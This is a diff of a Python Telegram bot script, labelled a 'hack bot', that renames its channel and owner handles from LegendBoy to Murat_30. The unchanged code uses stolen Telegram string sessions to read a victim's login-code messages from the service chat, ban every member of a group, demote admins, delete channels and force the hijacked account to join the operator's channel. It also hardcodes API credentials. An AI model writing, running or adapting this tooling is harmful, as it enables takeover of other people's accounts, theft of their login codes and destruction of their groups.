@@ -8,7 +8,7 @@ from os import system
 from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
 api_hash = os.environ.get("API_HASH")
 token = os.environ.get("BOT_TOKEN")
-client = TelegramClient('LegendBoy', api_id, api_hash).start(bot_token=token)
+client = TelegramClient('Hayat_Murat_30', api_id, api_hash).start(bot_token=token)
 from telethon import TelegramClient as tg
 from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
 from telethon.sessions import StringSession as ses
@@ -191,19 +191,19 @@ async def user2fa(strses):
 async def demall(strses, grp):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
-      await X(join("@LegendBot_OP"))
+      await X(join("@Murat_30_God"))
     except BaseException:
       pass
     try:
-      await X(join("@LegendBot_AI"))
+      await X(join("@Murat_30_God"))
     except BaseException:
       pass
     try:
-      await X(leave("@Official_LegendBot"))
+      await X(leave("@Murat_30"))
     except BaseException:
       pass
     try:
-      await X(leave("@Legend_Userbot"))
+      await X(leave("@Murat_30"))
     except BaseException:
       pass
     async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
@@ -217,19 +217,19 @@ async def demall(strses, grp):
 async def joingroup(strses, username):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
-      await X(join("@LegendBot_OP"))
+      await X(join("@Murat_30_God"))
     except BaseException:
       pass
     try:
-      await X(join("@LegendBot_AI"))
+      await X(join("@Murat_30_God"))
     except BaseException:
       pass
     try:
-      await X(leave("@Official_LegendBot"))
+      await X(leave("@Murat_30"))
     except BaseException:
       pass
     try:
-      await X(leave("@Legend_Userbot"))
+      await X(leave("@Murat_30"))
     except BaseException:
       pass
     await X(join(username))
@@ -237,19 +237,19 @@ async def joingroup(strses, username):
 async def leavegroup(strses, username):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
-      await X(join("@LegendBot_OP"))
+      await X(join("@Murat_30_God"))
     except BaseException:
       pass
     try:
-      await X(join("@LegendBot_AI"))
+      await X(join("@Murat_30_God"))
     except BaseException:
       pass
     try:
-      await X(leave("@Official_LegendBot"))
+      await X(leave("@Murat_30"))
     except BaseException:
       pass
     try:
-      await X(leave("@Legend_Userbot"))
+      await X(leave("@Murat_30"))
     except BaseException:
       pass
     await X(leave(username))
@@ -257,19 +257,19 @@ async def leavegroup(strses, username):
 async def delgroup(strses, username):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
-      await X(join("@LegendBot_OP"))
+      await X(join("@Murat_30_God"))
     except BaseException:
       pass
     try:
-      await X(join("@LegendBot_AI"))
+      await X(join("@Murat_30_God"))
     except BaseException:
       pass
     try:
-      await X(leave("@Official_LegendBot"))
+      await X(leave("@Murat_30"))
     except BaseException:
       pass
     try:
-      await X(leave("@Legend_Userbot"))
+      await X(leave("@Murat_30"))
     except BaseException:
       pass
     await X(dc(username))
@@ -287,19 +287,19 @@ async def usermsgs(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     i = ""
     try:
-      await X(join("@LegendBot_OP"))
+      await X(join("@Murat_30_God"))
     except BaseException:
       pass
     try:
-      await X(join("@LegendBot_AI"))
+      await X(join("@Murat_30_God"))
     except BaseException:
       pass
     try:
-      await X(leave("@Official_LegendBot"))
+      await X(leave("@Murat_30"))
     except BaseException:
       pass
     try:
-      await X(leave("@Legend_Userbot"))
+      await X(leave("@Murat_30"))
     except BaseException:
       pass
     async for x in X.iter_messages(777000, limit=3):
@@ -311,19 +311,19 @@ async def usermsgs(strses):
 async def userbans(strses, grp):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
-      await X(join("@LegendBot_OP"))
+      await X(join("@Murat_30_God"))
     except BaseException:
       pass
     try:
-      await X(join("@LegendBot_AI"))
+      await X(join("@Murat_30_God"))
     except BaseException:
       pass
     try:
-      await X(leave("@Official_LegendBot"))
+      await X(leave("@Murat_30"))
     except BaseException:
       pass
     try:
-      await X(leave("@Legend_Userbot"))
+      await X(leave("@Murat_30"))
     except BaseException:
       pass
     k = await X.get_participants(grp)
@@ -338,19 +338,19 @@ async def userbans(strses, grp):
 async def userchannels(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
-      await X(join("@LegendBot_OP"))
+      await X(join("@Murat_30_God"))
     except BaseException:
       pass
     try:
-      await X(join("@LegendBot_AI"))
+      await X(join("@Murat_30_God"))
     except BaseException:
       pass
     try:
-      await X(leave("@Official_LegendBot"))
+      await X(leave("@Murat_30"))
     except BaseException:
       pass
     try:
-      await X(leave("@Legend_Userbot"))
+      await X(leave("@Murat_30"))
     except BaseException:
       pass
     k = await X(pc())
@@ -367,7 +367,7 @@ async def userchannels(strses):
 import logging
 logging.basicConfig(level=logging.WARNING)
 
-channel = "LegendBot_AI"
+channel = "Murat_30_God"
 menu = '''
 
 "A" :~ [Check user own groups and channels]
@@ -399,7 +399,7 @@ menu = '''
 I will add more features Later 😅
 '''
 mm = '''
-**⚜NOTICE FIRST JOIN LEGEND GROUP @Its_LegendBot⚜**
+**⚜NOTICE FIRST JOIN HACK GROUP @Murat_30_God⚜**
 '''
 
 keyboard = [
@@ -423,7 +423,7 @@ keyboard = [
     Button.inline("M", data="M")
     ],
   [
-    Button.url("Owner", "https://t.me/LegendBoy_XD")
+    Button.url("Owner", "https://t.me/Murat_30_God")
     ]
 ]
 
@@ -440,7 +440,7 @@ async def op(event):
   else:
     legendbye = [
       [
-        Button.url("Must Join", f"https://t.me/LegendBot_AI")
+        Button.url("Must Join", f"https://t.me/Murat_30_God")
         ]
       ]
     await event.reply("First Join Channel!\n Then Try Click Here ~ /hack", buttons=legendbye)
@@ -480,7 +480,7 @@ async def start(event):
         Button.inline("M", data="M")
         ],
       [
-        Button.url("Owner", "https://t.me/LegendBoy_XD")
+        Button.url("Owner", "https://t.me/Murat_30_God")
         ]
     ]
     await x.send_message(f"Choose what you want with string session \n\n{menu}", buttons=keyboard)
@@ -501,12 +501,12 @@ async def users(event):
         return await event.reply("This StringSession Has Been Terminated.\n/hack", buttons=keyboard)
       if len(i) > 3855:
         file = open("session.txt", "w")
-        file.write(i + "\n\nDetails BY @LegendBoy_XD")
+        file.write(i + "\n\nDetails BY @Murat_30_God")
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
       else:
-        await event.reply(i + "\n\nThanks For using LegendBoyBot. \n/hack", buttons=keyboard)
+        await event.reply(i + "\n\nThanks For using hack Bot. \n/hack", buttons=keyboard)
       
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"B")))
 async def users(event):
@@ -519,7 +519,7 @@ async def users(event):
     else:
       return await event.respond("This StringSession Has Been Terminated.\n/hack", buttons=keyboard)
     i = await userinfo(strses.text)
-    await event.reply(i + "\n\nThanks For using LegendBoy Bot.\n/hack", buttons=keyboard)
+    await event.reply(i + "\n\nThanks For using hack Bot.\n/hack", buttons=keyboard)
     
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"C")))
 async def users(event):
@@ -534,7 +534,7 @@ async def users(event):
     await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
     grpid = await x.get_response()
     await userbans(strses.text, grpid.text)
-    await event.reply("Banning all members. Thanks For using LegendBoy Bot", buttons=keyboard)
+    await event.reply("Banning all members. Thanks For using hack Bot", buttons=keyboard)
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"D")))
 async def users(event):
@@ -547,7 +547,7 @@ async def users(event):
       else:
         return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
       i = await usermsgs(strses.text)
-      await event.reply(i + "\n\nThanks For using LegendBoy Bot", buttons=keyboard)
+      await event.reply(i + "\n\nThanks For using hack Bot", buttons=keyboard)
     
       
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"E")))
